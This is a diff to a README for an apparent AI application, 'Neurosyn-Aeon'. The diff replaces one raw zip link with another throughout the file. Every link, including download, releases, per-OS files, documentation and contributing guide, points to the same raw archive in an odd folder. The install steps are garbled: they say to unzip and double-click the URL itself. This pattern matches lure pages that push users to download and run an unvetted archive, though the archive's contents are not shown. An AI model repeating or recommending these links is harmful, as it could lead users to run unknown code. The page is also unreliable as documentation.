@@ -4,7 +4,7 @@
 Neurosyn-Aeon offers a seamless way to bring artificial intelligence into your environment. This application helps you leverage machine-readable structures for various AI tasks. 
 
 ## 📥 Download Neursyn-Aeon
-[![Download Neurosyn-Aeon](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip)
+[![Download Neurosyn-Aeon](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip)
 
 ## 💻 System Requirements
 To run Neurosyn-Aeon smoothly, ensure your computer meets these requirements:
@@ -22,31 +22,31 @@ Neurosyn-Aeon includes:
 - **Sigil Integration:** Seamlessly work with existing AI tools and frameworks.
 
 ## 📥 Download & Install
-To run Neurosyn-Aeon, visit [this page to download](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip). Here’s how to get started:
+To run Neurosyn-Aeon, visit [this page to download](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip). Here’s how to get started:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version. You will find it listed at the top.
 3. Download the appropriate file for your operating system. Choose between:
-   - **Windows:** Look for `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip`
-   - **MacOS:** Look for `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip`
-   - **Linux:** Look for `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip`
+   - **Windows:** Look for `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip`
+   - **MacOS:** Look for `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip`
+   - **Linux:** Look for `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip`
 4. Once the file download is complete, locate it in your downloads folder.
 
 ## 🛠️ Running Neurosyn-Aeon
 After downloading, follow these simple steps:
 
 ### For Windows:
-- Unzip the `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip` file.
-- Open the folder and double-click `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip`.
+- Unzip the `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip` file.
+- Open the folder and double-click `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip`.
 - The application will launch, and you'll see the main interface.
 
 ### For MacOS:
-- Unzip the `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip` file.
+- Unzip the `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip` file.
 - Drag and drop the Neurosyn-Aeon app into your Applications folder.
-- Open your Applications folder and double-click `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip`.
+- Open your Applications folder and double-click `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip`.
 
 ### For Linux:
-- Extract the `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip` file.
+- Extract the `https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip` file.
 - Open a terminal window, navigate to the extracted folder.
 - Run the command `./Neurosyn-Aeon` to start the application.
 
@@ -62,10 +62,10 @@ No, Neurosyn-Aeon is built for all users, regardless of their technical skills. 
 Yes, you can visit the Issues section on our GitHub repository if you encounter any problems. You can also find helpful documentation there.
 
 ## 📚 Learn More
-For additional resources and tutorials, you can visit the [Documentation](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip). This will guide you through various features and functionalities of the application.
+For additional resources and tutorials, you can visit the [Documentation](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip). This will guide you through various features and functionalities of the application.
 
 ## 💬 Get Involved
-We welcome contributions from users. If you'd like to help improve Neurosyn-Aeon, check out our [Contributing Guide](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/Maimonidean/Neurosyn-Aeon.zip) for details on how to get started.
+We welcome contributions from users. If you'd like to help improve Neurosyn-Aeon, check out our [Contributing Guide](https://raw.githubusercontent.com/imhabibbd/Neurosyn-Aeon/main/img/Aeon_Neurosyn_3.9.zip) for details on how to get started.
 
 ## 📰 Stay Updated
 To keep up with updates, consider following the repository on GitHub. This ensures you won’t miss any new releases or improvements.
